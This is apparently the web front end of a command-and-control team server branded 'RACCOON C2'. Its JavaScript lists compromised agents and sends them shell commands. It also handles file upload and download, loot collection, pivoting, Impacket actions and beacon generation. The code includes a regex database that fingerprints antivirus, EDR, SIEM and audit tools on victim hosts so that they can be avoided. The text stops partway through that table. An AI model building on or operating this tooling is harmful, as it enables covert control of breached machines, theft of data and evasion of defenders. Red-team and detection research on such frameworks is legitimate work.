.bgen-deob-desc{font-size:10px;color:var(--text2);padding:6px 10px 0;letter-spacing:0.02em}
.c2pe-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:10000;display:flex;align-items:center;justify-content:center}
.c2pe-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:95vw;height:90vh;display:flex;flex-direction:column;overflow:hidden;position:relative}
.c2pe-topbar{display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid rgba(255,255,255,0.08);flex-shrink:0}
.c2pe-topbar h2{margin:0;font-size:14px;color:var(--text);flex:1}
.c2pe-topbar button{background:none;border:1px solid rgba(255,255,255,0.12);color:var(--text);padding:4px 12px;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit}
.c2pe-topbar button:hover{background:rgba(255,255,255,0.06)}
.c2pe-topbar .c2pe-lint-btn{border-color:rgba(255,26,26,0.4);color:var(--red)}
.c2pe-topbar .c2pe-lint-btn:hover{background:rgba(255,26,26,0.1)}
.c2pe-close{position:absolute;top:8px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer;z-index:2}
.c2pe-body{display:flex;flex:1;overflow:hidden}
.c2pe-editor-wrap{flex:1;display:flex;flex-direction:column;min-width:0}
.c2pe-edit-container{flex:1;position:relative;overflow:hidden}
.c2pe-edit-container pre,.c2pe-edit-container textarea{position:absolute;inset:0;margin:0;padding:12px 12px 12px 48px;font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:12px;line-height:1.6;tab-size:4;white-space:pre;overflow:auto;border:none;outline:none;resize:none}
.c2pe-edit-container pre{color:var(--text);pointer-events:none;z-index:1}
.c2pe-edit-container textarea{color:transparent;caret-color:var(--text);background:transparent;z-index:2;-webkit-text-fill-color:transparent}
.c2pe-lines{position:absolute;left:0;top:0;bottom:0;width:40px;padding:12px 6px 12px 0;text-align:right;font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:12px;line-height:1.6;color:var(--text2);opacity:0.4;pointer-events:none;z-index:3;overflow:hidden;user-select:none}
.c2pe-lint-bar{flex-shrink:0;max-height:160px;overflow-y:auto;border-top:1px solid rgba(255,255,255,0.08);padding:6px 12px;font-size:11px}
.c2pe-lint-bar:empty{display:none}
.c2pe-lint-item{display:flex;align-items:center;gap:8px;padding:2px 0;cursor:pointer}
.c2pe-lint-item:hover{background:rgba(255,255,255,0.04)}
.c2pe-lint-item .line{color:var(--blue);min-width:48px;font-family:monospace;font-size:10px}
.c2pe-lint-item .sev-error{color:var(--red)}
.c2pe-lint-item .sev-warning{color:var(--orange)}
.c2pe-lint-item .sev-info{color:var(--blue)}
.c2pe-lint-item .msg{color:var(--text);flex:1}
.c2pe-lint-summary{padding:4px 0;font-size:11px;color:var(--text2);border-bottom:1px solid rgba(255,255,255,0.06);margin-bottom:4px}
.c2pe-sidebar{width:320px;flex-shrink:0;border-left:1px solid rgba(255,255,255,0.08);overflow-y:auto;padding:0}
.c2pe-tut-section{border-bottom:1px solid rgba(255,255,255,0.06)}
.c2pe-tut-hdr{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;cursor:pointer;font-size:12px;font-weight:600;color:var(--text);user-select:none}
.c2pe-tut-hdr:hover{background:rgba(255,255,255,0.04)}
.c2pe-tut-hdr .chevron{font-size:10px;color:var(--text2);transition:transform .2s}
.c2pe-tut-section.open .chevron{transform:rotate(90deg)}
.c2pe-tut-body{display:none;padding:0 12px 10px;font-size:11px;color:var(--text2);line-height:1.5}
.c2pe-tut-section.open .c2pe-tut-body{display:block}
.c2pe-tut-body code{background:rgba(255,255,255,0.06);padding:1px 4px;border-radius:2px;font-size:10px;color:var(--text)}
.c2pe-tut-body pre{background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;font-size:10px;line-height:1.5;overflow-x:auto;margin:6px 0;color:var(--text)}
.c2pe-tut-body table{width:100%;border-collapse:collapse;margin:6px 0;font-size:10px}
.c2pe-tut-body th,.c2pe-tut-body td{text-align:left;padding:3px 6px;border-bottom:1px solid rgba(255,255,255,0.06)}
.c2pe-tut-body th{color:var(--text);font-weight:600}
.c2pe-tut-body h4{margin:8px 0 4px;color:var(--text);font-size:11px}
.c2pe-hl-comment{color:#6a9955}
.c2pe-hl-string{color:#ce9178}
.c2pe-hl-keyword{color:#569cd6}
.c2pe-hl-block{color:#c586c0}
.c2pe-hl-transform{color:#dcdcaa}
.c2pe-hl-directive{color:#4ec9b0}
.c2pe-profile-btn{border-color:rgba(197,134,192,0.4)!important;color:#c586c0!important}
.c2pe-profile-btn:hover{background:rgba(197,134,192,0.1)!important}
.c2pe-badge{display:inline-block;background:rgba(197,134,192,0.15);color:#c586c0;font-size:9px;padding:1px 6px;border-radius:8px;margin-left:6px}
.burp-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:10001;display:flex;align-items:center;justify-content:center}
.burp-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:720px;max-height:85vh;overflow-y:auto;padding:20px;position:relative}
.burp-panel h3{margin:0 0 12px;font-size:14px;color:var(--text)}
.burp-panel .burp-row{display:flex;gap:12px;margin-bottom:10px}
.burp-panel .burp-col{flex:1;display:flex;flex-direction:column;gap:4px}
.burp-panel .burp-col label{font-size:11px;color:var(--text2);font-weight:600}
.burp-panel textarea{width:100%;height:180px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:11px;padding:8px;border-radius:4px;resize:vertical}
.burp-panel .burp-opts{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:10px 0}
.burp-panel .burp-opts label{font-size:10px;color:var(--text2)}
.burp-panel .burp-opts select,.burp-panel .burp-opts input{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);padding:4px 6px;border-radius:3px;font-size:11px;font-family:inherit}
.burp-panel .burp-section{font-size:11px;color:var(--text);font-weight:600;margin:12px 0 6px;padding-bottom:4px;border-bottom:1px solid rgba(255,255,255,0.08)}
.burp-panel .burp-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:14px}
.burp-panel .burp-actions button{padding:6px 16px;border-radius:4px;font-size:11px;cursor:pointer;border:1px solid rgba(255,255,255,0.12);background:none;color:var(--text);font-family:inherit}
.burp-panel .burp-actions .burp-generate{border-color:rgba(255,26,26,0.4);color:var(--red)}
.burp-panel .burp-actions .burp-generate:hover{background:rgba(255,26,26,0.1)}
.c2pe-lib-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:10001;display:flex;align-items:center;justify-content:center}
.c2pe-lib-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:780px;max-height:85vh;display:flex;flex-direction:column;overflow:hidden;position:relative}
.c2pe-lib-hdr{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid rgba(255,255,255,0.08);flex-shrink:0}
.c2pe-lib-hdr h3{margin:0;font-size:14px;color:var(--text);flex:1}
.c2pe-lib-hdr input{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);padding:5px 10px;border-radius:4px;font-size:11px;width:200px;font-family:inherit}
.c2pe-lib-close{position:absolute;top:10px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer}
.c2pe-lib-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:14px 16px;overflow-y:auto;flex:1}
.c2pe-lib-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:6px;padding:12px;cursor:pointer;transition:border-color .15s,background .15s}
.c2pe-lib-card:hover{border-color:rgba(197,134,192,0.5);background:rgba(197,134,192,0.04)}
.c2pe-lib-card h4{margin:0 0 4px;font-size:12px;color:var(--text);display:flex;align-items:center;gap:6px}
.c2pe-lib-card h4 .lib-icon{font-size:15px}
.c2pe-lib-card p{margin:0 0 6px;font-size:10px;color:var(--text2);line-height:1.4}
.c2pe-lib-tags{display:flex;gap:4px;flex-wrap:wrap}
.c2pe-lib-tag{font-size:9px;padding:1px 6px;border-radius:3px;background:rgba(255,255,255,0.06);color:var(--text2)}
.c2pe-lib-tag.t-cdn{background:rgba(86,156,198,0.12);color:var(--blue)}
.c2pe-lib-tag.t-saas{background:rgba(197,134,192,0.12);color:#c586c0}
.c2pe-lib-tag.t-api{background:rgba(78,201,176,0.12);color:var(--green)}
.c2pe-lib-tag.t-web{background:rgba(206,145,120,0.12);color:var(--orange)}
.bgen-flow-toggle{display:flex;align-items:center;gap:6px;cursor:pointer;padding:6px 0 2px;font-size:11px;color:var(--text2);user-select:none;border:none;background:none;font-family:inherit;width:100%}
.bgen-flow-toggle:hover{color:var(--text)}
.bgen-flow-toggle .chevron{font-size:9px;transition:transform .2s}
.bgen-flow-toggle.open .chevron{transform:rotate(90deg)}
.bgen-flow-wrap{display:none;padding:8px 0 4px}
.bgen-flow-toggle.open+.bgen-flow-wrap{display:block}
.bflow{display:flex;flex-direction:column;align-items:center;gap:0}
.bflow-node{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:8px 12px;width:100%;display:flex;align-items:center;gap:10px;font-size:11px}
.bflow-node.active{border-color:var(--red);background:rgba(255,26,26,0.06)}
.bflow-node.profile{border-color:rgba(197,134,192,0.5);cursor:pointer}
.bflow-node.profile:hover{background:rgba(197,134,192,0.08)}
.bflow-node.burp{border-color:rgba(206,145,120,0.5);cursor:pointer}
.bflow-node.burp:hover{background:rgba(206,145,120,0.08)}
.bflow-node.lint{border-color:rgba(78,201,176,0.4)}
.bflow-node.gen{border-color:rgba(77,170,87,0.5)}
.bflow-icon{font-size:16px;flex-shrink:0;width:24px;text-align:center}
.bflow-body{flex:1;min-width:0}
.bflow-title{font-weight:600;font-size:11px;color:var(--text)}
.bflow-desc{font-size:10px;color:var(--text2);margin-top:1px}
.bflow-arrow{display:flex;flex-direction:column;align-items:center;padding:2px 0;color:var(--text2)}
.bflow-arrow svg{display:block}
.bflow-arrow-line{width:1px;height:8px;background:rgba(255,255,255,0.12)}
.bflow-split{display:flex;gap:6px;width:100%}
.bflow-split .bflow-node{flex:1}
.bflow-or{display:flex;align-items:center;gap:0;width:100%;padding:2px 0}
.bflow-or-line{flex:1;height:1px;background:rgba(255,255,255,0.08)}
.bflow-or-badge{font-size:8px;color:var(--text2);padding:1px 8px;border:1px solid rgba(255,255,255,0.08);border-radius:8px;text-transform:uppercase;letter-spacing:0.04em}
</style>
</head>
<body>
<div id="app">
  <header>
    <img src="/logo.png" alt="Logo" onerror="this.style.display='none'">
    <h1>RACCOON C2</h1>
    <span class="subtitle">Team Server</span>
    <div class="spacer"></div>
    <span class="status-dot"></span>
    <span class="info" id="server-info">Listening</span>
    <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
    <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
    <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
    <div class="bell-wrap">
      <button class="bell-btn" onclick="toggleNotifPanel()" title="Notifications">&#128276;<span class="bell-badge" id="bell-badge"></span></button>
      <div class="notif-panel" id="notif-panel">
        <div class="notif-header">
          <span>Notifications</span>
          <button onclick="clearNotifs()">Clear all</button>
        </div>
        <div class="notif-list" id="notif-list">
          <div class="notif-empty">No notifications yet</div>
        </div>
      </div>
    </div>
    <div class="gear-wrap">
      <button class="gear-btn" onclick="toggleSettings()" title="Server Settings">&#9881;</button>
      <div class="settings-panel" id="settings-panel">
        <div class="settings-header">
          <span>&#9881; Server Configuration</span>
          <button onclick="toggleSettings()">&#10005;</button>
        </div>
        <div class="settings-body" id="settings-body">
          <div style="padding:20px;text-align:center;color:var(--text2)">Loading...</div>
        </div>
      </div>
    </div>
  </header>
  <div class="main">
    <div class="sidebar">
      <h2>Agents</h2>
      <div class="agent-list" id="agent-list"></div>
    </div>
    <div class="content" id="content">
      <div class="empty"></div>
    </div>
  </div>
</div>
<div class="toast-container" id="toast-container"></div>
<div class="srvlog-drawer" id="srvlog-drawer">
  <div class="srvlog-header">
    <span>&#128220; Server Log</span>
    <button onclick="closeSrvLog()">&#10005;</button>
  </div>
  <div class="srvlog-controls" id="srvlog-controls"></div>
  <div class="srvlog-body" id="srvlog-body"></div>
</div>

<script>
const TOKEN = "{{TOKEN}}";
const H = {"Authorization":"Bearer "+TOKEN,"Content-Type":"application/json"};
let selectedAgent = null;
let pollTimer = null;
let cmdHistory = [];
let cmdIdx = -1;
let knownAgents = {};
let lastHistLen = {};
let notifLog = [];
let unreadCount = 0;

function toast(type, title, msg, duration){
  const c = document.getElementById("toast-container");
  if(c){
    const el = document.createElement("div");
    el.className = "toast t-"+type;
    const icons = {success:"&#9989;",warning:"&#9888;",error:"&#10060;",info:"&#128276;"};
    el.innerHTML = '<span class="t-icon">'+(icons[type]||icons.info)+'</span>'
      +'<div class="t-body"><div class="t-title">'+title+'</div>'
      +'<div class="t-msg">'+msg+'</div></div>';
    c.appendChild(el);
    setTimeout(() => { el.classList.add("fade-out"); setTimeout(() => el.remove(), 300); }, duration||5000);
  }
  notifLog.unshift({type, title, msg, time:new Date()});
  if(notifLog.length>50) notifLog.length=50;
  unreadCount++;
  updateBellBadge();
  renderNotifList();
}

function updateBellBadge(){
  const b = document.getElementById("bell-badge");
  if(!b) return;
  b.textContent = unreadCount>0 ? (unreadCount>99?"99+":unreadCount) : "";
  b.setAttribute("data-count", unreadCount);
}

function toggleNotifPanel(){
  const p = document.getElementById("notif-panel");
  if(!p) return;
  const opening = !p.classList.contains("open");
  p.classList.toggle("open");
  if(opening){ unreadCount=0; updateBellBadge(); renderNotifList(); }
}

function clearNotifs(){
  notifLog = [];
  unreadCount = 0;
  updateBellBadge();
  renderNotifList();
}

function renderNotifList(){
  const list = document.getElementById("notif-list");
  if(!list) return;
  if(!notifLog.length){ list.innerHTML='<div class="notif-empty">No notifications yet</div>'; return; }
  list.innerHTML = "";
  const icons = {success:"&#9989;",warning:"&#9888;",error:"&#10060;",info:"&#128276;"};
  notifLog.forEach((n,i) => {
    const el = document.createElement("div");
    el.className = "notif-item t-"+n.type+(i<unreadCount?" unread":"");
    const ago = timeSince(n.time.toISOString());
    el.innerHTML = '<span class="ni-icon">'+(icons[n.type]||icons.info)+'</span>'
      +'<div class="ni-body"><div class="ni-title">'+n.title+'</div>'
      +'<div class="ni-msg">'+n.msg+'</div></div>'
      +'<span class="ni-time">'+ago+'</span>';
    list.appendChild(el);
  });
}

document.addEventListener("click", e => {
  const panel = document.getElementById("notif-panel");
  const wrap = e.target.closest(".bell-wrap");
  if(panel && panel.classList.contains("open") && !wrap) panel.classList.remove("open");
});

async function api(path, opts){
  const r = await fetch(path, {headers:H, ...opts});
  return r.json();
}

async function refreshAgents(){
  const agents = await api("/api/agents");
  const list = document.getElementById("agent-list");
  list.innerHTML = "";
  agents.sort((a,b) => {
    const order = {online:0,stale:1,offline:2};
    return (order[a.status]||9) - (order[b.status]||9);
  });

  const currentIds = {};
  agents.forEach(a => {
    currentIds[a.agent_id] = a;
    const prev = knownAgents[a.agent_id];
    if(!prev){
      toast("success", "Agent Connected", esc(a.agent_id)+"<br>"+esc((a.user||"?")+"@"+(a.hostname||"?"))+" &middot; "+esc(a.os||"?"), 8000);
    } else if(prev.status!=="offline" && a.status==="offline"){
      toast("warning", "Agent Offline", esc(a.agent_id)+" went offline", 6000);
    } else if(prev.status==="offline" && a.status==="online"){
      toast("success", "Agent Back Online", esc(a.agent_id)+" reconnected", 5000);
    }
    knownAgents[a.agent_id] = {status:a.status};
  });

  agents.forEach(a => {
    const card = document.createElement("div");
    card.className = "agent-card" + (selectedAgent===a.agent_id?" active":"");
    card.onclick = () => selectAgent(a.agent_id);
    card.innerHTML = `
      <div class="name"><span class="dot ${a.status}"></span>${esc(a.agent_id)}</div>
      <div class="meta">${esc(a.user||'?')}@${esc(a.hostname||'?')} &middot; ${esc(a.os||'?')}</div>
      <div class="meta">${esc(a.arch||'')} &middot; last: ${timeSince(a.last_seen)}</div>
    `;
    list.appendChild(card);
  });
  document.getElementById("server-info").textContent = agents.length+" agent"+(agents.length!==1?"s":"");
}

async function checkTaskResults(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const prevLen = lastHistLen[selectedAgent]||0;
  if(hist.length>prevLen){
    for(let i=prevLen;i<hist.length;i++){
      const h = hist[i];
      if(h.status==="error"||h.status==="fail"){
        toast("error", "Task Failed", esc(h.cmd+(h.args?" "+h.args:""))+"<br>"+esc((h.output||"").substring(0,80)), 6000);
      }
    }
  }
  lastHistLen[selectedAgent] = hist.length;
}

function selectAgent(id){
  if(selectedAgent === id){
    selectedAgent = null;
    if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
    document.getElementById("content").innerHTML = '<div class="empty"></div>';
    refreshAgents();
    return;
  }
  selectedAgent = id;
  if(pollTimer) clearInterval(pollTimer);
  renderAgentView(id);
  pollTimer = setInterval(() => pollHistory(id), 2000);
  refreshAgents();
}

async function renderAgentView(id){
  const info = await api("/api/agents/"+id);
  const hist = await api("/api/agents/"+id+"/history");
  const content = document.getElementById("content");
  content.innerHTML = `
    <div class="agent-header">
      <span class="agent-name">${esc(id)}</span>
      <span class="tag">${esc(info.arch||'?')}</span>
      <span class="tag">${esc(info.os||'?')}</span>
      <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
      ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
      ${info.c2_profile && info.c2_profile.active ? '<span class="tag" style="background:#4a1a6e;cursor:pointer" onclick="showBeaconConfig()" title="Click for details">&#128737; C2 Profile</span>' : '<span class="tag" style="background:#333;opacity:0.5">No C2 Profile</span>'}
    </div>
    <div class="terminal-wrap">
      <div class="toolbar">
        <button onclick="openFileBrowser()"><span class="ico">&#128194;</span> Files</button>
        <button onclick="triggerUpload()"><span class="ico">&#11014;</span> Upload</button>
        <button onclick="promptDownload()"><span class="ico">&#11015;</span> Download</button>
        <button onclick="quickCmd('shell','whoami','whoami')"><span class="ico">&#128100;</span> whoami</button>
        <button onclick="quickCmd('shell','id','id')"><span class="ico">&#128273;</span> id</button>
        <button onclick="quickCmd('shell','uname -a','sysinfo')"><span class="ico">&#128187;</span> sysinfo</button>
        <button onclick="showProcs()"><span class="ico">&#9881;</span> procs</button>
        <button onclick="runAvEnum()"><span class="ico">&#128737;</span> AV/EDR</button>
        <button onclick="showNetstat()"><span class="ico">&#127760;</span> netstat</button>
        <button onclick="showBeaconConfig()"><span class="ico">&#9881;</span> Beacon</button>
        <button onclick="showPivotMap()"><span class="ico">&#127760;</span> Pivot Map</button>
        <button onclick="showImpacketMenu(this)"><span class="ico">&#9876;</span> Impacket</button>
        <button onclick="showLootViewer()"><span class="ico">&#128142;</span> Loot</button>
        <button onclick="showAgentLog()"><span class="ico">&#128196;</span> Agent Log</button>
        <button onclick="showHelp()"><span class="ico">&#10067;</span> Help</button>
      </div>
      <div class="terminal-split">
        <div class="terminal-left">
          <div class="terminal" id="terminal"></div>
        </div>
        <div class="resizer" id="resizer"></div>
        <div class="side-panel" id="side-panel">
          <div class="side-panel-header">
            <span class="title" id="panel-title">Panel</span>
            <button onclick="closePanel()">✕</button>
          </div>
          <div class="side-panel-body" id="panel-body"></div>
        </div>
      </div>
      <div class="input-bar">
        <span class="prompt">${esc(id)} &#10095;</span>
        <div style="flex:1;position:relative">
          <span class="ghost" id="ac-ghost"></span>
          <input id="cmd-input" placeholder="Type a command... (Tab to complete)" autocomplete="off" style="width:100%;position:relative;z-index:1;background:rgba(0,0,0,0.5)">
          <div class="ac-dropdown" id="ac-dropdown"></div>
        </div>
        <button onclick="sendCmd()">Send</button>
      </div>
    </div>
  `;
  const term = document.getElementById("terminal");
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;

  const input = document.getElementById("cmd-input");
  input.addEventListener("keydown", handleInputKey);
  input.addEventListener("input", updateAutocomplete);
  input.focus();
}

function colorizeOutput(text){
  let s = esc(text);
  s = s.replace(/^(total\s+\d+)$/gm, '<span style="color:var(--text2)">$1</span>');
  s = s.replace(/^(d[rwxsStT-]{9})/gm, '<span style="color:var(--red)">$1</span>');
  s = s.replace(/^(-[rwxsStT-]{9})/gm, '<span style="color:var(--green)">$1</span>');
  s = s.replace(/^((?:\/[\w._-]+)+\/?)/gm, '<span style="color:var(--yellow)">$1</span>');
  s = s.replace(/((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?)/g, '<span style="color:var(--yellow)">$1</span>');
  s = s.replace(/\b(root|SYSTEM|Administrator)\b/g, '<span style="color:var(--red);font-weight:700">$1</span>');
  s = s.replace(/\b(LISTEN|ESTABLISHED|CONNECTED)\b/g, '<span style="color:var(--green)">$1</span>');
  s = s.replace(/\b(CLOSE_WAIT|TIME_WAIT|FIN_WAIT\w*)\b/g, '<span style="color:var(--orange)">$1</span>');
  s = s.replace(/\b(ERROR|FAILED|denied|refused|Permission denied)\b/gi, '<span style="color:#ff6666;font-weight:700">$1</span>');
  return s;
}

function renderHistoryEntry(h){
  const term = document.getElementById("terminal");
  if(!term) return;
  const full = h.cmd + (h.args ? " " + h.args : "");
  let html = '<div class="t-cmd"><span style="color:var(--yellow)">'+esc(h.cmd)+'</span>';
  if(h.args) html += ' <span style="color:var(--text)">'+esc(h.args)+'</span>';
  html += '</div>';
  if(h.status==="pending"||h.status===null){
    html += '<div class="t-pending">&#9203; waiting for agent...</div>';
  } else if(h.status==="ok"){
    html += '<div class="t-output">'+colorizeOutput(h.output||"(no output)")+'</div>';
  } else {
    html += '<div class="t-error">'+colorizeOutput(h.output||"(error)")+'</div>';
  }
  term.innerHTML += html;
}

async function sendCmd(){
  const input = document.getElementById("cmd-input");
  const raw = input.value.trim();
  if(!raw || !selectedAgent) return;
  input.value = "";
  cmdHistory.push(raw);
  cmdIdx = -1;

  const parts = raw.split(/\s+/);
  const cmd = parts[0];
  let args = parts.slice(1).join(" ");
  let data = "";

  if(cmd==="upload" && parts.length>=2){
    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.onchange = async () => {
      const file = fileInput.files[0];
      if(!file) return;
      const buf = await file.arrayBuffer();
      const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
      await api("/api/agents/"+selectedAgent+"/task",{method:"POST",body:JSON.stringify({cmd,args,data:b64})});
      pollHistory(selectedAgent);
    };
    fileInput.click();
    return;
  }

  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST",
    body:JSON.stringify({cmd,args,data})
  });
  pollHistory(selectedAgent);
}

async function pollHistory(id){
  if(id !== selectedAgent) return;
  const hist = await api("/api/agents/"+id+"/history");
  const term = document.getElementById("terminal");
  if(!term) return;
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;
  refreshAgents();
}

function esc(s){
  if(s==null) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function timeSince(iso){
  if(!iso) return "never";
  const d = (Date.now()-new Date(iso).getTime())/1000;
  if(d<60) return Math.floor(d)+"s ago";
  if(d<3600) return Math.floor(d/60)+"m ago";
  if(d<86400) return Math.floor(d/3600)+"h ago";
  return Math.floor(d/86400)+"d ago";
}

function formatUptime(s){
  if(s<60) return s+"s";
  if(s<3600) return Math.floor(s/60)+"m";
  if(s<86400) return Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m";
  return Math.floor(s/86400)+"d "+Math.floor((s%86400)/3600)+"h";
}

// ── Side panel ──
let panelPollTimer = null;

function openPanel(title, content, layout){
  const panel = document.getElementById("side-panel");
  const body = document.getElementById("panel-body");
  const titleEl = document.getElementById("panel-title");
  titleEl.textContent = title;
  body.innerHTML = content;
  body.classList.remove("pivot-layout");
  if(layout === "pivot") body.classList.add("pivot-layout");
  panel.classList.add("open");
}

function closePanel(){
  document.getElementById("side-panel").classList.remove("open");
  fbVisible = false;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
  stopPivotAnim();
}

// ── Resizer ──
(function(){
  let startX, startW, resizer, panel;
  document.addEventListener("mousedown", e => {
    if(!e.target.closest("#resizer")) return;
    resizer = document.getElementById("resizer");
    panel = document.getElementById("side-panel");
    if(!panel.classList.contains("open")) return;
    startX = e.clientX;
    startW = panel.offsetWidth;
    resizer.classList.add("active");
    document.body.style.cursor = "col-resize";
    document.body.style.userSelect = "none";
    const onMove = ev => { panel.style.width = Math.max(200, startW - (ev.clientX - startX))+"px"; };
    const onUp = () => {
      resizer.classList.remove("active");
      document.body.style.cursor = "";
      document.body.style.userSelect = "";
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
    document.addEventListener("mousemove", onMove);
    document.addEventListener("mouseup", onUp);
  });
})();

// ── Quick commands ──
async function quickCmd(cmd, args, toPanel){
  if(!selectedAgent) return;
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd, args, data:""})
  });
  if(toPanel){
    openPanel(toPanel, '<div class="t-pending">Waiting for agent...</div>');
    if(panelPollTimer) clearInterval(panelPollTimer);
    panelPollTimer = setInterval(() => pollPanelResult(cmd, args, toPanel), 1500);
  }
  pollHistory(selectedAgent);
}

async function pollPanelResult(cmd, args, title){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd===cmd && h.args===args);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(last.status==="ok"){
    body.innerHTML = '<div class="t-output">'+esc(last.output||"(no output)")+'</div>';
  } else {
    body.innerHTML = '<div class="t-error">'+esc(last.output||"(error)")+'</div>';
  }
}

// ── Process listing with AV/EDR detection ──
const EDR_DB = [
  {re:/MsMpEng|MpCmdRun|NisSrv|SecurityHealthService|WinDefend/i, name:"Windows Defender", cat:"av", sev:"med"},
  {re:/MsSense|SenseCncProxy|SenseIR/i, name:"Defender for Endpoint (EDR)", cat:"edr", sev:"high"},
  {re:/cb\.exe|CbDefense|CbOsQueryExt|cbdaemon|cbagentd|CarbonBlack/i, name:"Carbon Black", cat:"edr", sev:"high"},
  {re:/CrowdStrike|CSFalcon|csagent|falconhost|falcon-sensor|CSAgent/i, name:"CrowdStrike Falcon", cat:"edr", sev:"high"},
  {re:/SentinelOne|SentinelAgent|sentinelctl|SentinelHelper/i, name:"SentinelOne", cat:"edr", sev:"high"},
  {re:/cortex|traps|Traps|CyvrFsFlt|CyveraService|PanGPS/i, name:"Palo Alto Cortex XDR", cat:"edr", sev:"high"},
  {re:/elastic-agent|elastic-endpoint|filebeat|metricbeat|winlogbeat/i, name:"Elastic EDR", cat:"edr", sev:"high"},
  {re:/xagt|xagtnotif|FireEye|MandiantAgent|HXService/i, name:"Trellix/FireEye HX", cat:"edr", sev:"high"},
  {re:/cylance|CylanceSvc|CyProtectDrv|CyOptics/i, name:"Cylance", cat:"edr", sev:"high"},
  {re:/tanium|TaniumClient|TaniumCX/i, name:"Tanium", cat:"edr", sev:"high"},
  {re:/qualys|QualysAgent/i, name:"Qualys", cat:"edr", sev:"med"},
  {re:/rapid7|ir_agent/i, name:"Rapid7 InsightAgent", cat:"edr", sev:"high"},
  {re:/LTSvc|LTTray|ScreenConnect|ConnectWise/i, name:"ConnectWise/ScreenConnect", cat:"rmm", sev:"med"},
  {re:/kavp|avp\.exe|avpui|KES\w/i, name:"Kaspersky", cat:"av", sev:"high"},
  {re:/bdagent|vsserv|EPSecurityService|bdntwrk/i, name:"Bitdefender", cat:"av", sev:"med"},
  {re:/savservice|SophosAgent|SophosClean|SophosMTR|hmpalert|sophos/i, name:"Sophos", cat:"edr", sev:"high"},
  {re:/mcshield|McAfee|masvc|mfemms|mfefire|mfevtps/i, name:"McAfee/Trellix", cat:"av", sev:"med"},
  {re:/eset_nod|ekrn|egui|ERAAgent/i, name:"ESET", cat:"av", sev:"med"},
  {re:/avast|AvastSvc|aswEngSrv|aswToolsSvc/i, name:"Avast", cat:"av", sev:"low"},
  {re:/avgnt|avguard|AVGSvc/i, name:"AVG", cat:"av", sev:"low"},
  {re:/f-secure|fshoster|fsav|fsdevcon|WithSecure/i, name:"WithSecure/F-Secure", cat:"av", sev:"med"},
  {re:/symantec|ccSvcHst|Rtvscan|SepMasterService|smc\.exe|SEP\w/i, name:"Symantec SEP", cat:"av", sev:"med"},
  {re:/splunkd|splunk-|SplunkForwarder/i, name:"Splunk (SIEM)", cat:"siem", sev:"high"},
  {re:/ossec|wazuh/i, name:"Wazuh/OSSEC", cat:"siem", sev:"high"},
  {re:/snort|suricata/i, name:"Snort/Suricata (IDS)", cat:"ids", sev:"high"},
  {re:/auditd|auditctl|aureport/i, name:"Linux Audit", cat:"audit", sev:"med"},
  {re:/osquery/i, name:"osquery", cat:"audit", sev:"med"},
  {re:/sysmon|Sysmon64/i, name:"Sysmon", cat:"audit", sev:"high"},
  {re:/logrhythm|LogRhythm/i, name:"LogRhythm (SIEM)", cat:"siem", sev:"high"},
  {re:/nessus|nessusd/i, name:"Nessus Scanner", cat:"scanner", sev:"med"},
